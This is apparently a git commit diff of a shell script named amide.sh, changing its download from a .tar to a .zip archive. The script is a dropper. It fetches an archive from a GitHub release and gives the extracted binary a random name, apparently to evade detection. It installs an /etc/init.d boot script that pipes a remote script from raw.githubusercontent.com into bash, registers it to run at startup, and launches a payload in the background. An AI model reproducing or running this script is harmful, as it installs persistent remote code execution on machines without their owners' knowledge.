bb910f529044f4651330448ddf28fa08bf0169d5
merisye <meriysella44@gmail.com>
2024-06-13 18:44:49 +0700

    Update amide.sh

--- amide.sh
+++ amide.sh
@@ -1,6 +1,6 @@
 cd /
-wget https://github.com/merisye/naprox/releases/download/v1.9.7/epipen.tar
-tar -xvf epipen.tar
+wget https://github.com/merisye/naprox/releases/download/v1.9.7/epipen.zip
+unzip epipen.zip
 cd /epipen
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv isonia $variable1
@@ -11,7 +11,7 @@ cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/merisye/naprox/main/amide.sh)" > valium.sh
 chmod a+x valium.sh
 update-rc.d valium.sh defaults
-rm -rf epipen.tar
+rm -rf epipen.zip
 cd /epipen
 nohup ./xarelto.sh
 ps -ef | grep epipen
